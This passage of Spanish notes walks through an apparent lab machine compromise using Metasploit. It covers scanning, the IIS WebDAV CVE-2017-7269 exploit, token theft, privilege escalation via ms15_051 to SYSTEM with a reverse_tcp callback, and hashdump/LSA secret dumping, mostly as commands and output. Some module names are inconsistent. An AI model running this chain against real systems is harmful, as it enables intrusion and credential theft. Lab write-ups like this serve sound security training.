La carga útil del meterpreter (payload) garantiza que la conexión host-víctima sea estable y difícil de detectar.

## Utilidades del meterpreter 
### nmap - db_map

Podemos ejecutar en msfconsole un:
```
msf6 > db_nmap -sV -p- -T5 -A 10.10.10.15
```
Salida:
```shell-session
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-03 09:55 UTC
[*] Nmap: Nmap scan report for 10.10.10.15
[*] Nmap: Host is up (0.021s latency).
[*] Nmap: Not shown: 65534 filtered ports
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 80/tcp open  http    Microsoft IIS httpd 6.0
[*] Nmap: | http-methods:
[*] Nmap: |_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
[*] Nmap: |_http-server-header: Microsoft-IIS/6.0
[*] Nmap: |_http-title: Under Construction
[*] Nmap: | http-webdav-scan:
[*] Nmap: |   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
[*] Nmap: |   WebDAV type: Unknown
[*] Nmap: |   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
[*] Nmap: |   Server Date: Thu, 03 Sep 2020 09:56:46 GMT
[*] Nmap: |_  Server Type: Microsoft-IIS/6.0
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 59.74 seconds
```
Para hacer un escaneo del tipo "nmap" pero guardando los datos en la base de datos de msfconsole.

Tras realizar este escaneo, al ejecutar "hosts": 
```
msf6 > hosts
```
Salida:

```shell-session
Hosts
=====

address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------      ---  ----  -------  ---------  -----  -------  ----  --------
10.10.10.15             Unknown                    device         
```


Y al ejecutar "services":
```
msf6 > services
```

Salida:
```shell-session
Services
========

host         port  proto  name  state  info
----         ----  -----  ----  -----  ----
10.10.10.15  80    tcp    http  open   Microsoft IIS httpd 6.0
```

Haciendo una búsqueda rápida por internet "Microsoft IIS httpd 6.0 exploit", observo que existe un CVE asociado llamado: *CVE-2017-7269*.
Pues, en msfconsole ejecuto:
```
search 2017-7269
```
Obteniendo la salida:
```
Matching Modules
================

   #  Name                                                 Disclosure Date  Rank    Check  Description
   -  ----                                                 ---------------  ----    -----  -----------
   0  exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual  Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow

```

Vamos a utilizar dicho módulo y consultaremos sus opciones:
```
use 0
options
```

Establecemos un RHOST y LHOST válido y le damos a run:
```shell-session
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set RHOST 10.10.10.15
RHOST => 10.10.10.15

msf6 exploit(windows/iis/iis_webdav_upload_asp) > set LHOST tun0
LHOST => tun0

msf6 exploit(windows/iis/iis_webdav_upload_asp) > run
```

Y con esto, entablamos una conexión meterpreter.

## Comandos básicos de meterpreter

#### getuid
Permite conocer qué usuario está ejecutando en la máquina remota. Es equivalente al comando «whoami» en Windows. El nivel de privilegios del usuario ejecutando el _payload_ será el mismo que el del _software_ con la vulnerabilidad explotada para el ciberataque.

```
meterpreter > getuid
```
Salida:
```shell-session
meterpreter > getuid

[-] 1055: Operation failed: Access is denied.
```

Por el momento, no tengo permisos de usuario.  Esto suele deberse a que el payload/servicio corre con privilegios limitados.
#### ps
Sirve para listar todos los procesos del sistema. También da información sobre qué usuario ejecutó la aplicación que inició el proceso y con qué nivel de privilegios.
```
meterpreter > ps
```

Salida esperada:
```shell-session
Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]                                                
 4     0     System                                                          
 216   1080  cidaemon.exe                                                    
 272   4     smss.exe                                                        
 292   1080  cidaemon.exe                                                    
<...SNIP...>

 1712  396   alg.exe                                                         
 1836  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1920  396   dllhost.exe                                                     
 2232  3552  svchost.exe        x86   0                                      C:\WINDOWS\Temp\rad9E519.tmp\svchost.exe
 2312  592   wmiprvse.exe                                                    
 3552  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 3624  592   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 4076  1080  cidaemon.exe      
```


Veo que hay varios procesos abiertos, pues, podría robar el token del 1836 para transformar mi sesión de meterpreter a una con el usuario "NT AUTHORITY\NETWORK SERVICE".
Robo el toquen y miro que usuario soy:
```shell-session
meterpreter > steal_token 1836

Stolen token with username: NT AUTHORITY\NETWORK SERVICE


meterpreter > getuid

Server username: NT AUTHORITY\NETWORK SERVICE
```

Desde este momento, dispongo de algunos privilegios en el sistema. 
Vamos a intentar escalar privilegios. 
Navegando por el sistema vulnerado, encuentro una carpeta con los siguientes directorios:

```cmd-session
c:\Inetpub>dir

dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of c:\Inetpub

04/12/2017  05:17 PM    <DIR>          .
04/12/2017  05:17 PM    <DIR>          ..
04/12/2017  05:16 PM    <DIR>          AdminScripts
09/03/2020  01:10 PM    <DIR>          wwwroot
               0 File(s)              0 bytes
               4 Dir(s)  18,125,160,448 bytes free


c:\Inetpub>cd AdminScripts

cd AdminScripts
Access is denied.
```

Sin embargo, no puedo acceder a la carpeta "AdminScripts" debido a que no cuento con los permisos suficientes. 

Existe una módulo de msfvenom que es el "local_exploit_suggester". Vamos a poner en background la sesión de meterpreter actual ejecutando:
```
meterpreter > background     (o "bg" tambíen podría escribir)
```

Ejecuto un:
```
msf6 > search local_exploit_suggester
```

Pues, lo seleccióno, establezco la sessión de meterpreter abierta (la podría consultar con "sessions -l" y le doy a run):
 ```
 use 0                # para utilizar el local_exploit_suggester
 set session 1        # para decirle contra que sesión de meterpreter quiero utilizar este módulo
 run
 ```

Esto nos devuelve una salida con varias opciones que podríamos probar:
```shell-session
meterpreter > bg

Background session 1? [y/N]  y


msf6 exploit(windows/iis/iis_webdav_upload_asp) > search local_exploit_suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


msf6 exploit(windows/iis/iis_webdav_upload_asp) > use 0
msf6 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1

SESSION => 1


msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.15 - Collecting local exploits for x86/windows...
[*] 10.10.10.15 - 34 exploit checks are being tried...
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
msf6 post(multi/recon/local_exploit_suggester) > 
```


Las opciones son 
``
```

[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```

Tenemos varias opciones, pero tras probarlas individualmente solo se obtiene una root de shell con el módulo "ms15_051_client_copy_image".
Utilizaremos pues ese módulo:
```
use exploit/windows/local/ms15_051_client_copy_image
```

Como resumen, se hará: 
```
use exploit/windows/local/ms15_051_client_copy_images
set session 1                                                   #la sesión inicial 1 de meterpreter
set LHOST tun0
run
```

Extendido, es:
```shell-session
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_images

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp


msf6 exploit(windows/local/ms15_051_client_copy_image) > show options

Module options (exploit/windows/local/ms15_051_client_copy_image):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     46.101.239.181   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf6 exploit(windows/local/ms15_051_client_copy_image) > set session 1

session => 1


msf6 exploit(windows/local/ms15_051_client_copy_image) > set LHOST tun0

LHOST => tun0


msf6 exploit(windows/local/ms15_051_client_copy_image) > run

[*] Started reverse TCP handler on 10.10.14.26:4444 
[*] Launching notepad to host the exploit...
[+] Process 844 launched.
[*] Reflectively injecting the exploit DLL into 844...
[*] Injecting exploit into 844...
[*] Exploit injected. Injecting payload into 844...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.10.10.15
[*] Meterpreter session 2 opened (10.10.14.26:4444 -> 10.10.10.15:1031) at 2020-09-03 10:35:01 +0000


meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```


## Una vez que somos root....
Ya podemos sacarle el jugo completo a meterpreter:
- meterpreter > hashdump
	- obtiene los hashes de contraseñas almacenados en la base SAM/NTLM de Windows. Con esos hashes un atacante puede intentar pases por hash o cracking offline.
- meterpreter > lsa_dump_sam
	- exponen secretos guardados por el servicio LSA (Local Security Authority), que pueden incluir credenciales, claves de servicio y secretos de dominio. Revelar esos datos permite pivotar y escalar privilegios.
- meterpreter > lsa_dump_secrets
	- exponen secretos guardados por el servicio LSA (Local Security Authority), que pueden incluir credenciales, claves de servicio y secretos de dominio. Revelar esos datos permite pivotar y escalar privilegios.


